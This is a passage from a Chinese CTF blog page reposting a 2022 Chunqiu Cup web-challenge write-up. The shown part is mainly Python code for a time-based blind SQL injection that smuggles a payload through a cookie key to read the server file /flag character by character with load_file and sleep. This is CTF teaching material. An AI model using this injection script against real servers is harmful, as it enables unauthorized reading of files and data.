&#x27;CellState&#x27;:&#x27;eyJhbGciOiJTSEEyNTYiLCJ0eXAiOiJKV1QifQ%3D%3D.eyJkYXRhIjoie1wic2NvcmVcIjoxNCxcImdyaWRcIjp7XCJzaXplXCI6NCxcImNlbGxzXCI6W1t7XCJwb3NpdGlvblwiOntcInJvd1wiOjAsXCJjb2x1bW5cIjowfSxcInZhbHVlXCI6XCJQM1wifSx7XCJwb3NpdGlvblwiOntcInJvd1wiOjAsXCJjb2x1bW5cIjoxfSxcInZhbHVlXCI6XCJQMVwifSxudWxsLHtcInBvc2l0aW9uXCI6e1wicm93XCI6MCxcImNvbHVtblwiOjN9LFwidmFsdWVcIjpcIlAyXCJ9XSxbe1wicG9zaXRpb25cIjp7XCJyb3dcIjoxLFwiY29sdW1uXCI6MH0sXCJ2YWx1ZVwiOlwiUDNcIn0sbnVsbCxudWxsLG51bGxdLFtudWxsLG51bGwsbnVsbCxudWxsXSxbe1wicG9zaXRpb25cIjp7XCJyb3dcIjozLFwiY29sdW1uXCI6MH0sXCJ2YWx1ZVwiOlwiUDFcIn0sbnVsbCxudWxsLG51bGxdXX19In0%3D.i1gMALvm9gfZ0D9An5AaPRyusDS54Pcm7gTrpdxkW%2B4%3D&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        mid=(left+right)/2</span><br><span class="line">        t1=time.time()</span><br><span class="line">        requests.get(url,headers=headers,cookies=cookies)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        if t2-t1 &gt;1:</span><br><span class="line">            left=mid</span><br><span class="line">        else:</span><br><span class="line">            right=mid</span><br><span class="line">        print left,right</span><br><span class="line">    flag+=chr(right)</span><br><span class="line">    print flag</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">headers=&#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;&#125;</span><br><span class="line"></span><br><span class="line">url=&#x27;http://IP:</span><br><span class="line">PORT/&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    left=33</span><br><span class="line">    right=128</span><br><span class="line"></span><br><span class="line">    while right-left!=1:</span><br><span class="line">        mid=(left+right)/2</span><br><span class="line">        t1=time.time()</span><br><span class="line">        payload=&quot;(substr((select/**/binary/**/load_file(0x2f666c6167)),&#123;i&#125;,1)&gt;binary/**/&#123;mid&#125;)/**/and/**/sleep(1)&quot;.format(i=i,mid=hex(mid))</span><br><span class="line">        cookies=&#123;&#x27;BestScore&#x27;:&#x27;eyJhbGciOiJTSEEyNTYiLCJ0eXAiOiJKV1QifQ%3D%3D.eyJkYXRhIjoiMTQifQ%3D%3D.qOpAjZhKzZ8T3N2TYpP3MN5BQm%2FI5icfuEkzVqfqVgw%3D&#x27;, &#x27;CellState&#x27;:&#x27;eyJhbGciOiJTSEEyNTYiLCJ0eXAiOiJKV1QifQ%3D%3D.eyJkYXRhIjoiMTQifQ%3D%3D.qOpAjZhKzZ8T3N2TYpP3MN5BQm%2FI5icfuEkzVqfqVgw%3D&#x27;,&#x27;CellState`,(select/**/&#123;payload&#125;)as/**/`a&#x27;.format(payload=payload):&#x27;eyJhbGciOiJTSEEyNTYiLCJ0eXAiOiJKV1QifQ%3D%3D.eyJkYXRhIjoiMTQifQ%3D%3D.qOpAjZhKzZ8T3N2TYpP3MN5BQm%2FI5icfuEkzVqfqVgw%3D&#x27;&#125;</span><br><span class="line">        r=requests.get(url,headers=headers,cookies=cookies)</span><br><span class="line">        t2=time.time()</span><br><span class="line">        if t2-t1 &gt;1:</span><br><span class="line">            left=mid</span><br><span class="line">        else:</span><br><span class="line">            right=mid</span><br><span class="line">        print left,right</span><br><span class="line">    flag+=chr(right)</span><br><span class="line">    print flag</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/42191.html">https://www.ctfiot.com/42191.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E3%80%90WP%E3%80%912022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9BWeb%E7%B1%BB%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90.full.md">CTF大赛WP集合&#x2F;articles&#x2F;【WP】2022年春秋杯春季赛Web类题目解析.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Swoole/">Swoole</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/ctf-kb/wp/Web/TryHackMe_Overpass_writeup/" title="TryHackMe Overpass writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe Overpass writeup</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/ctf-kb/wp/Web/idek_2022-_Web_-_Crypto_Writeup_by_r3kapig/" title="idek 2022: Web &amp;&amp; Crypto Writeup by r3kapig"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">idek 2022: Web &amp;&amp; Crypto Writeup by r3kapig</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#http-127-0-0-1-poc-php-cmd-phpinfo-args-1"><span class="toc-number">1.</span> <span class="toc-text">http:&#x2F;&#x2F;127.0.0.1&#x2F;poc.php?cmd&#x3D;phpinfo&amp;args&#x3D;-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.1.</span> <span class="toc-text">附图</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
